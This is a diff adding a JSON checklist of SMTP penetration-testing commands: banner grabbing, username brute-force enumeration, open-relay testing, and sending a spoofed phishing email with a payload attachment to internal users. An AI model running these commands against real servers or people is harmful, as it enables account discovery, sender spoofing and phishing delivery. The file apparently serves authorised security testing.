@@ -1,0 +1,55 @@
+{
+  "service": "SMTP",
+  "port": 25,
+  "categories": [
+    {
+      "category": "1. Recon & Banner Grabbing",
+      "tasks": [
+        {
+          "id": "smtp_banner",
+          "title": "Banner & Nmap Scripts",
+          "description": "The banner usually reveals the mail server software and version. Nmap's smtp-commands script also shows which commands (VRFY, EXPN, RCPT) are supported.",
+          "commands": [
+            "nc -nv {target_ip} 25",
+            "nmap -sV -p 25 --script smtp-commands,smtp-open-relay {target_ip}"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "2. User Enumeration",
+      "tasks": [
+        {
+          "id": "smtp_user_enum",
+          "title": "VRFY / EXPN / RCPT TO Enumeration",
+          "description": "Use smtp-user-enum to brute-force valid usernames if VRFY is enabled, or automate the RCPT TO method when it's disabled but the server still leaks user validity.",
+          "commands": [
+            "smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t {target_ip}",
+            "smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t {target_ip}"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "3. Open Relay & Phishing",
+      "tasks": [
+        {
+          "id": "smtp_open_relay",
+          "title": "Test for Open Relay",
+          "description": "Attempt to relay mail through the server to an external address. If it accepts, you can spoof mail from arbitrary senders for phishing pretexts.",
+          "commands": [
+            "swaks --to victim@external.com --from test@{target_ip} --server {target_ip}"
+          ]
+        },
+        {
+          "id": "smtp_sendemail",
+          "title": "Send Phishing Email",
+          "description": "Send a crafted email (with an attachment/payload) to a discovered valid internal user.",
+          "commands": [
+            "sendemail -f \"it@corp.local\" -t \"victim@corp.local\" -u \"Action required\" -m \"See attached.\" -s {target_ip}:25 -a payload.pdf"
+          ]
+        }
+      ]
+    }
+  ]
+}
